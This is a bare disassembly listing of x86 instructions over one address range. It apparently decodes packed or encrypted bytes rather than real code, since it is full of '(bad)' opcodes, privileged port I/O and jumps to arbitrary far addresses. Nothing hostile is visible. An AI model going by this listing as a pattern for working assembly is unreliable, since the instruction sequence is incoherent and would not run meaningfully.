  413b10:	stos   DWORD PTR es:[edi],eax
  413b11:	mov    dl,0xc2
  413b13:	and    DWORD PTR [eax+ebp*1-0x5cb6a8ca],ebp
  413b1a:	loope  0x413ab6
  413b1c:	push   edi
  413b1d:	popa   
  413b1e:	not    BYTE PTR [ebx]
  413b20:	pop    es
  413b21:	sbb    bh,dh
  413b23:	cmp    al,BYTE PTR [edi-0x3362265d]
  413b29:	fcmovb st,st(7)
  413b2b:	sub    bh,dl
  413b2d:	not    ch
  413b2f:	mov    ah,0x41
  413b31:	mov    edi,DWORD PTR [ebx]
  413b33:	jns    0x413b99
  413b35:	pop    edi
  413b36:	bound  esp,QWORD PTR [ecx]
  413b38:	cwde   
  413b39:	clc    
  413b3a:	into   
  413b3b:	dec    esi
  413b3c:	sub    ebx,DWORD PTR [esi]
  413b3e:	rcl    DWORD PTR [esi],1
  413b40:	nop
  413b41:	jl     0x413aca
  413b43:	not    BYTE PTR [ebp+0x5c]
  413b46:	(bad)  
  413b47:	aas    
  413b48:	inc    esp
  413b49:	out    dx,al
  413b4a:	lds    ecx,FWORD PTR [ecx+0xee7f7ff]
  413b50:	fsub   DWORD PTR [edi-0x3b]
  413b53:	or     DWORD PTR [ebx],0x1984541d
  413b59:	xchg   ecx,eax
  413b5a:	les    eax,FWORD PTR [esi-0x6491c53f]
  413b60:	ins    DWORD PTR es:[edi],dx
  413b61:	dec    ecx
  413b62:	and    BYTE PTR [ecx+0x18d60e95],ah
  413b68:	mov    DWORD PTR [ecx+0x19bf65f4],ebx
  413b6e:	mov    ebx,0x926a947a
  413b73:	inc    edi
  413b74:	or     eax,0x860f136f
  413b79:	sbb    BYTE PTR [esi+ebp*2],al
  413b7c:	scas   eax,DWORD PTR es:[edi]
  413b7d:	pop    ebx
  413b7f:	jle    0x413bb3
  413b81:	in     eax,0x18
  413b83:	fnstsw WORD PTR [esi]
  413b85:	xlat   BYTE PTR ds:[ebx]
  413b86:	sbb    ebx,edi
  413b88:	(bad)  
  413b89:	mov    ebx,0x209ce768
  413b8e:	dec    esi
  413b8f:	fsubr  QWORD PTR [esp+edx*8-0x3b]
  413b93:	fwait
  413b94:	clc    
  413b95:	jbe    0x413b9c
  413b97:	or     DWORD PTR [ebx+eax*4],eax
  413b9a:	(bad)
  413b9d:	jns    0x413c02
  413b9f:	das    
  413ba0:	xchg   ebx,eax
  413ba1:	les    edx,FWORD PTR [eax]
  413ba3:	cmp    eax,0x27363acf
  413ba8:	into   
  413ba9:	mov    dl,0x22
  413bab:	mov    cl,0xa8
  413bad:	je     0x413c13
  413baf:	mov    ecx,0x4da16852
  413bb4:	loopne 0x413bb4
  413bb6:	push   0x1f
  413bb8:	add    esi,eax
  413bba:	stos   BYTE PTR es:[edi],al
  413bbb:	out    0x61,al
  413bbd:	dec    ebp
  413bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bbf:	and    esi,0x21
  413bc2:	iret   
  413bc3:	push   edx
  413bc4:	jle    0x413b55
  413bc6:	std    
  413bc7:	mov    ebp,0x3d90299
  413bcc:	xchg   edi,esi
  413bce:	xchg   edx,eax
  413bcf:	sub    dl,bh
  413bd1:	mov    ebx,0xb1793006
  413bd6:	push   ds
  413bd7:	aam    0xa6
  413bd9:	es ret 
  413bdb:	sahf   
  413bdc:	lock push ebp
  413bde:	es aaa 
  413be0:	xchg   esi,eax
  413be1:	add    ebp,DWORD PTR [edi*2+0x7f3e959d]
  413be8:	mov    ebp,0x1baa6e2e
  413bed:	cmp    DWORD PTR [esi+0x51],esi
  413bf0:	shl    DWORD PTR [eax],1
  413bf2:	inc    ebp
  413bf3:	sub    esi,edi
  413bf5:	dec    edx
  413bf6:	xor    eax,DWORD PTR [eax-0x2f]
  413bf9:	push   ebx
  413bfa:	xor    DWORD PTR [edi+0x5e875633],ebx
  413c00:	xor    al,BYTE PTR ss:[edx-0x2a]
  413c04:	mov    DWORD PTR [ecx],ebx
  413c06:	dec    edx
  413c07:	or     dh,BYTE PTR [ecx+0x6f9d8b95]
  413c0d:	mov    ds:0xfca940e4,al
  413c12:	and    bh,BYTE PTR [esi+ecx*4+0x7eb4c234]
  413c19:	in     eax,dx
  413c1a:	fstp   QWORD PTR [edi+esi*1-0x6dcd9005]
  413c21:	sub    esp,DWORD PTR [ebx+0x3f02dabe]
  413c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c28:	sub    BYTE PTR [eax+0x1585aabe],bh
  413c2e:	jmp    0x8d9f549c
  413c33:	shl    cl,0x79
  413c36:	lds    esp,FWORD PTR [edi+0x5bdd1fc8]
  413c3c:	sub    eax,0x9d6f6c29
  413c41:	adc    DWORD PTR [ebp-0x77],0x10
  413c45:	jae    0x413bdf
  413c47:	es jbe 0x413bd7
  413c4a:	jp     0x413c19
  413c4c:	in     eax,0x6b
  413c4e:	push   ecx
  413c4f:	xor    eax,0xeb11cf98
  413c54:	out    dx,eax
  413c55:	into   
  413c56:	mov    ecx,0x2a727cae
  413c5b:	mov    edx,0x75cf533b
  413c60:	call   0xfd89:0x1e2540df
  413c67:	ins    DWORD PTR es:[edi],dx
  413c68:	add    cl,dl
  413c6a:	jmp    0x413c64
  413c6c:	mov    ah,0xbd
  413c6e:	dec    ebx
  413c6f:	popa   
  413c70:	(bad)  
  413c71:	mov    ah,0x26
  413c73:	cmp    DWORD PTR [edi+edx*2+0xa],ecx
  413c77:	aaa    
  413c78:	adc    BYTE PTR [edi+0x5793ac34],dh
  413c7e:	rol    BYTE PTR [ebx-0xd],1
  413c81:	test   eax,0x934ec346
  413c86:	adc    BYTE PTR [edx-0x783c46b6],bl
  413c8c:	imul   esp,DWORD PTR [edi],0xc633348a
  413c92:	inc    ebp
  413c93:	or     eax,0x435be912
  413c98:	jp     0x413cbd
  413c9a:	xchg   edi,eax
  413c9b:	cmp    al,0x3a
  413c9d:	jl     0x413c5a
  413c9f:	pop    edx
  413ca0:	and    al,0xa5
  413ca2:	inc    ecx
  413ca3:	push   ebp
  413ca4:	mov    esp,0x90a1b6e4
  413ca9:	ja     0x413cad
  413cab:	sbb    eax,0x659b9187
  413cb0:	fst    QWORD PTR [ebx+eiz*2+0x61a2c479]
  413cb7:	(bad)  
  413cb8:	fist   WORD PTR [ebx+0x65d1cbc2]
  413cbe:	mov    eax,ds:0x52caea2
  413cc3:	xchg   ah,ch
  413cc5:	loop   0x413ca6
  413cc7:	aaa    
  413cc8:	inc    esi
  413cc9:	mov    BYTE PTR [edx+0x26],dl
  413ccc:	jmp    0x234e:0x6d940a3a
  413cd3:	lock pop ebp
  413cd5:	dec    ebp
  413cd6:	pop    edx
  413cd7:	or     BYTE PTR [esi+0x26],dh
  413cda:	cdq    
  413cdb:	in     al,dx
  413cdc:	outs   dx,DWORD PTR ds:[esi]
  413cdd:	dec    edi
  413cde:	js     0x413d4e
  413ce0:	enter  0xe003,0xeb
  413ce4:	imul   BYTE PTR [edx-0x7a]
  413ce7:	daa    
  413ce8:	hlt    
  413ce9:	stc    
  413cea:	fcmovnb st,st(2)
  413cec:	hlt    
  413ced:	dec    esp
  413cee:	cwde   
  413cef:	int    0xd1
  413cf1:	pop    eax
  413cf2:	mov    al,BYTE PTR [ecx-0x74ff8e1f]
  413cf8:	sbb    DWORD PTR [edi-0x7365687c],edi
  413cfe:	div    BYTE PTR [ecx+0x6c]
  413d01:	mov    al,0xc7
  413d03:	lahf   
  413d04:	mov    al,ds:0x63fa49f9
  413d09:	scas   al,BYTE PTR es:[edi]
  413d0a:	scas   al,BYTE PTR es:[edi]
  413d0b:	icebp  
  413d0c:	and    BYTE PTR [edx+0x6aae539],ch
  413d12:	push   esi
  413d13:	mov    DWORD PTR [edx+edi*8-0x75e1402],eax
  413d1a:	push   cs
  413d1b:	fmul   DWORD PTR [edx+0xb]
  413d1e:	add    BYTE PTR [eax-0x65],0xad
  413d22:	stc    
  413d23:	cli    
  413d24:	fwait
  413d25:	cs retf 0x1997
  413d29:	addr16 in eax,0xe7
  413d2c:	js     0x413cbe
  413d2e:	stc    
  413d2f:	sar    DWORD PTR [ecx+0x67a06953],1
  413d35:	adc    eax,0xe06a4ef8
  413d3a:	cmp    eax,0xce033690
  413d3f:	test   DWORD PTR [esi],edi
  413d41:	not    DWORD PTR [eax-0x2a9b5f89]
  413d47:	outs   dx,DWORD PTR ds:[esi]
  413d48:	(bad)  
  413d49:	loopne 0x413d70
  413d4b:	mov    ch,0x2c
  413d4d:	xchg   ebx,eax
  413d4e:	mov    ecx,0xaa746851
  413d53:	xlat   BYTE PTR ds:[ebx]
  413d54:	mov    bh,BYTE PTR [ebp+0x29b8716f]
  413d5a:	xchg   edi,eax
  413d5b:	sub    BYTE PTR [esi-0x79648f06],dl
  413d61:	pop    esp
  413d62:	dec    ebp
  413d63:	sahf   
  413d64:	loopne 0x413d5d
  413d66:	clc    
  413d67:	or     ebp,edx
  413d69:	mov    dl,0x6c
  413d6b:	add    eax,0x8e293a1e
  413d70:	jg     0x413de2
  413d72:	push   ebx
  413d73:	lods   eax,DWORD PTR ds:[esi]
  413d74:	inc    eax
  413d75:	retf   
  413d76:	leave  
  413d77:	add    al,0xee
  413d79:	es xor bh,0x69
  413d7d:	call   0xcd21ea7c
  413d82:	aas    
  413d83:	pop    eax
  413d84:	dec    ecx
  413d85:	pop    edi
  413d86:	cmp    eax,0xabde1213
  413d8b:	pop    esi
  413d8c:	inc    ebx
  413d8d:	jp     0x413d3f
  413d8f:	mov    esp,0xf6280886
  413d94:	adc    esi,ebx
  413d96:	jmp    0x5167ed67
  413d9b:	scas   al,BYTE PTR es:[edi]
  413d9c:	pop    ss
  413d9d:	repz sbb BYTE PTR [edx],bh
  413da0:	mov    ds:0x57849ca8,al
  413da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413da6:	mov    ebx,0x6d442cff
  413dab:	stos   DWORD PTR es:[edi],eax
  413dac:	add    DWORD PTR [esi],esp
  413dae:	inc    DWORD PTR [ecx+0x5f]
  413db1:	inc    esi
  413db2:	add    BYTE PTR [edi],dh
  413db4:	push   eax
  413db5:	arpl   WORD PTR [ecx-0x79],ax
  413db8:	into   
  413db9:	inc    ecx
  413dba:	shr    DWORD PTR [eax-0x14],1
  413dbd:	mov    eax,ds:0x70d74892
  413dc2:	int    0x98
  413dc4:	popf   
  413dc5:	scas   eax,DWORD PTR es:[edi]
  413dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dc7:	jge    0x413de0
  413dc9:	int3   
  413dca:	xchg   ebp,eax
  413dcb:	rol    DWORD PTR [ecx],1
  413dcd:	mov    ebx,0x31615edd
  413dd2:	js     0x413e3b
  413dd4:	jns    0x413dfd
  413dd6:	sar    dl,0xd2
  413dd9:	jae    0x413e48
  413ddb:	xor    dh,al
  413ddd:	pop    edi
  413dde:	fcomp  DWORD PTR [esi+0xb83577a]
  413de4:	push   ebp
  413de5:	shr    DWORD PTR [edi-0x14450d70],cl
  413deb:	hlt    
  413dec:	call   0x5c39c592
  413df1:	pop    esi
  413df2:	fimul  WORD PTR ds:0x879472b9
  413df8:	pop    si
  413dfa:	mov    al,ds:0x21250b7e
  413dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e00:	repnz push DWORD PTR [esi-0x23]
  413e04:	lds    esp,FWORD PTR [esi+eiz*2]
  413e07:	arpl   WORD PTR [edx],si
  413e09:	mov    DWORD PTR [esi+0x4ec6e8c1],0x4c234e60
  413e13:	jns    0x413e8c
  413e15:	xor    al,0x38
  413e17:	icebp  
  413e18:	jb     0x413e03
  413e1a:	jae    0x413df7
  413e1c:	out    0xa4,eax
  413e1e:	ss loope 0x413e83
  413e21:	out    dx,eax
  413e22:	pop    ebp
  413e23:	cmp    DWORD PTR [edx+esi*2],ebp
  413e26:	(bad)  
  413e27:	ret    
  413e28:	xchg   ecx,eax
  413e29:	push   cs
  413e2a:	cmp    al,0x8b
  413e2c:	mov    ecx,0xbd68592b
  413e31:	sub    BYTE PTR [ebx+0x2ba09754],dh
  413e37:	inc    edi
  413e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e3a:	in     al,0xcc
  413e3c:	push   es
  413e3d:	int3   
  413e3e:	test   ecx,ebx
  413e40:	ror    BYTE PTR [edx+0x54],1
  413e43:	aaa    
  413e44:	adc    eax,0x8778bcc7
  413e49:	dec    ebp
  413e4a:	and    al,0x92
  413e4c:	sar    DWORD PTR [ecx+0x22],1
  413e4f:	nop
  413e50:	cmp    BYTE PTR [ebp-0x72],cl
  413e53:	adc    ch,ch
  413e55:	xor    edi,DWORD PTR [ebx-0x4f73b2c3]
  413e5b:	sqrtps xmm5,XMMWORD PTR [eax]
  413e5e:	xlat   BYTE PTR ds:[ebx]
  413e5f:	int3   
  413e60:	jg     0x413ec5
  413e62:	in     eax,0x50
  413e64:	sbb    BYTE PTR [edx],bh
  413e66:	call   0xad051d1f
  413e6b:	addr16 inc edi
  413e6d:	std    
  413e6e:	outs   dx,BYTE PTR ds:[esi]
  413e6f:	out    dx,eax
  413e70:	adc    edi,eax
  413e72:	mov    al,0xc9
  413e74:	inc    ebx
  413e75:	sbb    dl,BYTE PTR [ecx+0x6cc5459c]
  413e7b:	and    DWORD PTR [ecx+esi*4+0x26b9fc4b],edx
  413e82:	xchg   DWORD PTR [eax],ecx
  413e84:	imul   edx,ecx,0xba92871c
  413e8a:	jne    0x413e9d
  413e8c:	dec    edi
  413e8d:	rcl    DWORD PTR [esi-0x571098ae],0xb8
  413e94:	out    0xaa,eax
  413e96:	jno    0x413ed0
  413e98:	dec    ecx
  413e99:	xchg   ebx,esi
  413e9b:	out    dx,al
  413e9c:	pop    ss
  413e9d:	cmp    eax,0x315e0c05
  413ea2:	mov    ah,0x97
  413ea4:	jecxz  0x413ec2
  413ea6:	xchg   esp,eax
  413ea7:	bound  eax,QWORD PTR [eax]
  413ea9:	nop
  413eaa:	cmp    al,0xe0
  413eac:	sbb    esi,DWORD PTR [esi+0x47d4c6c4]
  413eb2:	push   ebp
  413eb3:	xchg   edx,eax
  413eb4:	xor    DWORD PTR [ebx],0x956e3c09
  413eba:	mov    al,0x22
  413ebc:	inc    eax
  413ebd:	and    DWORD PTR [edi],ecx
  413ebf:	jo     0x413ee9
  413ec1:	inc    ebp
  413ec2:	xor    eax,0xc00c1946
  413ec7:	mov    eax,0xb5cf55bc
  413ecc:	dec    esp
  413ecd:	and    edx,DWORD PTR [ebx]
  413ecf:	mov    al,0x18
  413ed1:	push   ecx
  413ed2:	es popa 
  413ed4:	pop    ecx
  413ed5:	inc    ebx
  413ed6:	clc    
  413ed7:	out    0x1d,eax
  413ed9:	mov    bh,0x4a
  413edb:	xchg   edi,eax
  413edc:	pop    eax
  413edd:	cli    
  413ede:	out    0xb3,al
  413ee0:	adc    dl,BYTE PTR [eax+0x5ce288eb]
  413ee6:	aaa    
  413ee7:	outs   dx,DWORD PTR ds:[esi]
  413ee8:	mov    ecx,0xa7b735a2
  413eed:	aam    0x35
  413eef:	inc    ebx
  413ef0:	push   es
  413ef1:	cwde   
  413ef2:	pop    ds
  413ef3:	inc    esi
  413ef4:	jecxz  0x413f5b
  413ef6:	xchg   edi,eax
  413ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ef8:	cmp    eax,0x3130d1aa
  413efd:	lock (bad) 
  413eff:	enter  0x658e,0xb6
  413f03:	inc    ebx
  413f04:	dec    ebx
  413f05:	dec    ecx
  413f06:	scas   al,BYTE PTR es:[edi]
  413f07:	call   0x27ad46f4
  413f0c:	jno    0x413e97
  413f0e:	out    0x2a,al
  413f10:	in     eax,dx
  413f11:	pop    ds
  413f12:	outs   dx,BYTE PTR ds:[esi]
  413f13:	sub    ch,cl
  413f15:	xchg   ebx,eax
  413f16:	jl     0x413f78
  413f18:	enter  0x5f5c,0x1d
  413f1c:	and    ebx,ecx
  413f1e:	ret    0xb26d
  413f21:	mov    ch,0x43
  413f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f24:	int3   
  413f25:	pusha  
  413f26:	mov    eax,0xb1f76042
  413f2b:	mov    ebx,DWORD PTR [ebx-0x1b]
  413f2e:	rcr    cl,1
  413f30:	(bad)  
  413f32:	mov    WORD PTR [ecx-0x3e],ds
  413f35:	jl     0x413f8b
  413f37:	enter  0xa552,0xa9
  413f3b:	sbb    ebp,DWORD PTR ds:0x55be0adf
  413f41:	loopne 0x413f37
  413f43:	cli    
  413f44:	sub    edi,esp
  413f46:	loop   0x413f00
  413f48:	and    BYTE PTR [esi-0xb],bh
  413f4b:	std    
  413f4c:	into   
  413f4d:	sbb    edi,DWORD PTR [edi]
  413f4f:	out    0xcf,eax
  413f51:	lds    ebx,FWORD PTR [edi-0x75192bef]
  413f57:	xor    dl,BYTE PTR [esi+ecx*4+0x3]
  413f5b:	into   
  413f5c:	jbe    0x413faa
  413f5e:	repz bound ebx,QWORD PTR [esi-0x74]
  413f62:	not    BYTE PTR [edx]
  413f64:	lods   al,BYTE PTR ds:[esi]
  413f65:	popa   
  413f66:	(bad)  
  413f67:	cwde   
  413f68:	dec    esp
  413f69:	arpl   WORD PTR [esi-0x5e],bp
  413f6c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413f6e:	pop    ecx
  413f6f:	in     al,dx
  413f70:	stos   BYTE PTR es:[edi],al
  413f71:	sbb    al,0xee
  413f73:	loop   0x413f41
  413f75:	dec    esi
  413f76:	and    eax,0xf2f757b2
  413f7b:	dec    esp
  413f7c:	or     dh,dh
  413f7e:	pop    ebp
  413f7f:	repnz inc edx
  413f81:	adc    eax,0xe889a031
  413f86:	(bad)  
  413f87:	cmc    
  413f88:	fwait
  413f89:	pop    eax
  413f8a:	leave  
  413f8b:	dec    edi
  413f8c:	es xchg edi,eax
  413f8e:	in     al,0xa6
  413f90:	sbb    DWORD PTR [edi+0x12],0x28
  413f94:	shl    ch,0x9b
  413f97:	out    0x7a,eax
  413f99:	and    BYTE PTR [ecx],dl
  413f9b:	push   ds
  413f9c:	mov    cl,0x6f
  413f9e:	mov    edi,0x1dbe8fe
  413fa3:	sbb    eax,0xdf62f15
  413fa8:	jmp    0x6c2:0xd5588d2a
  413faf:	xor    bl,BYTE PTR [edi-0x75]
  413fb2:	scas   eax,DWORD PTR es:[edi]
  413fb3:	call   WORD PTR [eax]
  413fb6:	sub    DWORD PTR [esi+0x55],ebp
  413fb9:	mov    ebx,0x34d630e5
  413fbe:	icebp  
  413fbf:	mov    edi,0x49d22df1
  413fc4:	push   esp
  413fc5:	lea    edi,ss:0x71116406
  413fcc:	xchg   edx,eax
  413fcd:	adc    al,0xab
  413fcf:	adc    DWORD PTR [ebx+0x21],0xffffffbd
  413fd3:	lea    esi,[ecx+0x1a]
  413fd6:	div    BYTE PTR [ebx+0x9]
  413fd9:	adc    BYTE PTR [ebx+eax*1+0x32],0xe1
  413fde:	jle    0x413ff6
  413fe0:	xchg   ebx,eax
  413fe1:	je     0x413fdb
  413fe3:	aas    
  413fe4:	jmp    0x413fb6
  413fe6:	lods   eax,DWORD PTR ds:[esi]
  413fe7:	push   0x6c3e5844
  413fec:	jmp    0x413f8b
  413fee:	mov    bl,0x56
  413ff0:	ror    DWORD PTR [edi],cl
  413ff2:	out    dx,eax
  413ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ff4:	sbb    al,0xb0
  413ff6:	lods   al,BYTE PTR ds:[esi]
  413ff7:	mov    dl,0xce
  413ff9:	clc    
  413ffa:	outs   dx,DWORD PTR ds:[esi]
  413ffb:	xor    DWORD PTR [eax+0x7f],0xc791d099
  414002:	mov    ah,0x71
  414004:	or     al,0x2
  414006:	jp     0x413fed
  414008:	sbb    edi,esp
  41400a:	mov    esp,0x46a83a94
  41400f:	xor    al,0x5b
  414011:	icebp  
  414012:	cmp    ah,BYTE PTR [ecx]
  414014:	xchg   edx,edx
  414016:	xchg   ecx,eax
  414017:	clc    
  414018:	imul   edx,DWORD PTR [ebx+0x35],0xebac120e
  41401f:	sahf   
  414020:	sbb    dl,BYTE PTR [eax+0x3b]
  414023:	mov    ds,WORD PTR [ecx+0x1047518]
  414029:	mov    cl,0x4c
  41402b:	int3   
  41402c:	rol    BYTE PTR [esi+0x24],cl
  41402f:	adc    ecx,edi
  414031:	test   DWORD PTR [esi],esp
  414033:	ins    BYTE PTR es:[edi],dx
  414034:	data16 add BYTE PTR [ebx],al
  414037:	out    dx,al
  414038:	adc    BYTE PTR ds:0x94951d5b,bl
  41403e:	mov    BYTE PTR [edi],dh
  414040:	cs pop eax
  414042:	aad    0xe2
  414044:	or     BYTE PTR [eax+0x1b],0x25
  414048:	or     ebx,edi
  41404a:	add    DWORD PTR [eax],edx
  41404c:	cmp    dl,BYTE PTR [edx-0x6100f500]
  414052:	push   0x9761c136
  414057:	mov    al,0x17
  414059:	rol    ch,0x53
  41405c:	mov    BYTE PTR [ecx],dl
  41405e:	dec    ecx
  41405f:	popf   
  414060:	sti    
  414061:	addr16 retf 
  414063:	xchg   sp,ax
  414065:	jne    0x414081
  414067:	std    
  414068:	ret    
  414069:	pop    eax
  41406a:	stos   BYTE PTR es:[edi],al
  41406b:	aam    0xa8
  41406d:	cdq    
  41406e:	sbb    BYTE PTR [esi-0x2bf78f6f],dl
  414074:	and    ebx,DWORD PTR [edx+0xf22b955]
  41407a:	rol    al,cl
  41407c:	pop    ecx
  41407d:	fbstp  TBYTE PTR [ecx-0x6cbff7d9]
  414083:	jb     0x41400d
  414085:	adc    ch,BYTE PTR [esp+esi*4-0x72]
  414089:	add    al,0x82
  41408b:	ins    DWORD PTR es:[edi],dx
  41408c:	dec    esi
  41408d:	mov    ebp,0xd41ca706
  414092:	push   cs
  414093:	ror    BYTE PTR [esi+0x2a],0x50
  414097:	mov    ebx,0x6596ebae
  41409c:	xor    esi,ebp
  41409e:	and    al,0xee
  4140a0:	imul   esi,DWORD PTR [edi+0x2e822572],0x5bee8573
  4140aa:	mov    al,ds:0xce535c3b
  4140af:	andnps xmm6,XMMWORD PTR [ecx-0x534c6d5f]
  4140b6:	push   es
  4140b7:	and    ch,cl
  4140b9:	bound  edi,QWORD PTR [ecx]
  4140bb:	mov    dh,0xa5
  4140bd:	jg     0x4140fb
  4140bf:	js     0x414113
  4140c1:	xor    eax,0x1f0e4c3f
  4140c6:	loop   0x41411d
  4140c8:	pop    ds
  4140c9:	add    al,dh
  4140cb:	js     0x4140b3
  4140cd:	mov    ebx,0x4e50322e
  4140d2:	push   edx
  4140d3:	fnstsw WORD PTR [esi-0x3f]
  4140d6:	and    DWORD PTR [edi+0x15e7f2c4],0x51
  4140dd:	dec    ebx
  4140de:	loopne 0x414154
  4140e0:	test   BYTE PTR [edi-0xc],0x7
  4140e4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4140e6:	std    
  4140e7:	mov    al,ds:0xe0a360c4
  4140ec:	aaa    
  4140ed:	ds jae 0x4140fc
  4140f0:	xor    bh,BYTE PTR [eax]
  4140f2:	test   eax,0xe17050c8
  4140f7:	fs (bad) 
  4140f9:	push   ebx
  4140fa:	jg     0x414158
  4140fc:	push   edx
  4140fd:	ret    
  4140fe:	inc    eax
  4140ff:	mov    edx,0x260ff1b4
  414104:	dec    ebp
  414105:	mov    eax,0xe7304eca
  41410a:	or     BYTE PTR [ebx+0x4f],bh
  41410d:	call   0xef51:0xe2ce3811
  414114:	jmp    0xea2a2706
  414119:	fidivr WORD PTR [ebx+0x70]
  41411c:	imul   edi,DWORD PTR [edx+0x22],0x73
  414120:	and    BYTE PTR [eax],0x69
  414123:	or     DWORD PTR [eax+0x236eb2db],0x3e196564
  41412d:	rcr    BYTE PTR [ebp+0x7b],1
  414130:	sbb    edi,ebp
  414132:	sub    ah,bh
  414134:	rcl    BYTE PTR [ebp-0x25],0x2b
  414138:	mov    WORD PTR [esi-0x48],ds
  41413b:	cmp    DWORD PTR [ecx+eiz*8+0x53dca249],ecx
  414142:	adc    edx,DWORD PTR [eax]
  414144:	mov    ebx,0xa986a0f4
  414149:	sbb    BYTE PTR [ebp+0x7ab87b17],0x93
  414150:	and    ch,BYTE PTR [ecx-0x21fa90ff]
  414156:	or     eax,0x2da61cfa
  41415b:	jae    0x414115
  41415d:	pop    eax
  41415e:	push   ebx
  41415f:	pop    es
  414160:	pop    ebx
  414161:	pusha  
  414162:	fld    QWORD PTR [ebx]
  414164:	int3   
  414165:	cli    
  414166:	bound  edx,QWORD PTR [ecx]
  414168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414169:	ja     0x414119
  41416b:	xchg   edi,eax
  41416c:	and    eax,0x37345d52
  414171:	lahf   
  414172:	ja     0x41416f
  414174:	mov    ecx,0x2d4cc927
  414179:	(bad)  
  41417a:	mov    edi,0x6707eca1
  41417f:	mov    al,ds:0xa5f85209
  414184:	jg     0x414137
  414186:	push   ss
  414187:	xor    eax,0xe30309a4
  41418c:	jno    0x41413c
  41418e:	out    dx,eax
  41418f:	pop    ebp
  414190:	mov    ebx,ecx
  414192:	into   
  414193:	push   ebp
  414194:	inc    edi
  414195:	pop    ss
  414196:	inc    esp
  414197:	add    ah,cl
  414199:	call   0x5084:0x6b5f8a86
  4141a0:	ss xchg esp,eax
  4141a2:	test   ebp,ebx
  4141a4:	mov    eax,0xa0a47ca1
  4141a9:	cmc    
  4141aa:	push   ecx
  4141ab:	adc    BYTE PTR [ebp+ebp*8+0xae23a1d],ch
  4141b2:	dec    esi
  4141b3:	xchg   edi,eax
  4141b4:	enter  0x377b,0x4b
  4141b8:	xchg   esp,eax
  4141b9:	repnz repz jecxz 0x4141e0
  4141bd:	inc    esp
  4141be:	cmp    eax,0x5c7284b4
  4141c3:	int    0xf8
  4141c5:	cmp    al,0xd4
  4141c7:	clc    
  4141c8:	ror    DWORD PTR [edx],0x24
  4141cb:	pop    esp
  4141cc:	in     eax,0x59
  4141ce:	pop    edx
  4141cf:	push   esp
  4141d0:	inc    esi
  4141d1:	test   BYTE PTR [esp+esi*8],dh
  4141d4:	inc    esp
  4141d5:	clc    
  4141d6:	fstp   TBYTE PTR [edx-0x63933b3a]
  4141dc:	fdivr  DWORD PTR [esi]
  4141de:	es ins BYTE PTR es:[edi],dx
  4141e0:	test   al,0x2
  4141e2:	pop    esi
  4141e3:	stos   BYTE PTR es:[edi],al
  4141e4:	nop
  4141e5:	mov    ch,0xb7
  4141e7:	nop
  4141e8:	ret    0x5619
  4141eb:	shl    DWORD PTR [edx],cl
  4141ed:	arpl   WORD PTR [ebx-0x1af9c0cb],bp
  4141f3:	jle    0x41420a
  4141f5:	mov    edx,0x1b7cddd5
  4141fa:	pop    ebx
  4141fb:	(bad)  
  4141fc:	mul    BYTE PTR [ebp+edx*1-0x1a]
  414200:	imul   eax,DWORD PTR [ebx+ebx*2+0x58da846],0x55
  414208:	sub    dh,BYTE PTR [eax]
  41420a:	shl    DWORD PTR [eax+0x1a4e6b5c],1
  414210:	mov    ds:0x86870b26,al
  414215:	pop    ebp
  414216:	or     esi,esi
  414218:	inc    edi
  414219:	or     dh,BYTE PTR [edi+0x27169b6c]
  41421f:	dec    esi
  414220:	adc    esi,ecx
  414222:	pop    ebp
  414223:	scas   eax,DWORD PTR es:[edi]
  414224:	out    dx,eax
  414225:	push   esi
  414226:	lds    esi,FWORD PTR [esi-0x35]
  414229:	mov    ebp,0x8936ac5e
  41422e:	mov    ds:0xea203429,al
  414233:	and    BYTE PTR ds:0x3bf4002c,ch
  414239:	into   
  41423a:	enter  0xee7a,0xea
  41423e:	cmp    BYTE PTR [eax-0x5f],bh
  414241:	jne    0x4141c9
  414243:	out    dx,eax
  414244:	lock jecxz 0x414207
  414247:	repz mov eax,0xb163483a
  41424d:	xchg   DWORD PTR [ebx],ebp
  41424f:	sbb    bl,BYTE PTR [edi]
  414251:	xchg   edi,eax
  414252:	inc    edi
  414253:	dec    esp
  414254:	mov    ah,ah
  414256:	fisubr DWORD PTR [ebx+0x59]
  414259:	pxor   mm2,QWORD PTR [ebp-0x75]
  41425d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41425e:	dec    esi
  41425f:	sbb    BYTE PTR [esi],bh
  414261:	mov    dh,0x46
  414263:	mov    BYTE PTR [edx+edi*4],bh
  414266:	mov    ebx,0x362fa6bd
  41426b:	add    BYTE PTR [ecx+ebp*4-0x691bf885],dl
  414272:	je     0x41426a
  414274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414275:	out    0x4f,eax
  414277:	xlat   BYTE PTR ds:[ebx]
  414278:	cmp    dh,dl
  41427a:	cli    
  41427b:	das    
  41427c:	aas    
  41427d:	inc    esi
  41427e:	or     dl,BYTE PTR [edi+0x3249de98]
  414284:	sahf   
  414285:	mov    ah,0xa8
  414287:	push   esp
  414288:	(bad)
  41428c:	mov    bl,0xf2
  41428e:	mov    eax,ds:0x3ae34f7b
  414293:	mov    ch,0x52
  414295:	adc    al,0xfc
  414297:	lea    esi,[edx]
  414299:	sar    ecx,0x8d
  41429c:	out    0xf8,al
  41429e:	ficomp WORD PTR [esp+esi*2]
  4142a1:	mov    eax,0x6cf981cc
  4142a6:	mov    ebp,0x919cc9c1
  4142ab:	or     BYTE PTR [ecx+0xb],dh
  4142ae:	pop    ss
  4142af:	cmp    eax,0x1d009860
  4142b4:	scas   al,BYTE PTR es:[edi]
  4142b5:	add    BYTE PTR [eax],al
  4142b7:	mov    ecx,0xa2d92adb
  4142bc:	and    DWORD PTR [ebx-0x54],ecx
  4142bf:	jmp    0x414313
  4142c1:	fistp  WORD PTR [ebp+edx*4+0x26]
  4142c5:	mov    DWORD PTR [eax],ebx
